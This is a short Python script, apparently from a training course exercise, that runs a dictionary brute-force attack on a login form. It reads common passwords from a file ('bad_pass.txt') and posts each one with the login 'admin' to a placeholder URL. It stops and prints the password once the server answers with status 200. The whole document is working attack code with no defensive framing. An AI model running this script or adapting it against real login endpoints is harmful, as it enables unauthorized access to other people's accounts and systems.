import random
import requests

with open('Skillbox/Day2/bad_pass.txt') as f:
    pass_data = f.read()

popular_pass = pass_data.split('\n')
i = 0

def badgen():
    global i
    if i >= len(popular_pass):
        return

    password = popular_pass[i]
    i += 1
    return password

while True:
    password = badgen()
    if password is None:
        break
    data = {'login': 'admin', 'password': password}
    response = requests.post('xxx', json=data)
    if response.status_code == 200:
        print('Success! iteration: ', i, '; password: ', password)
        break

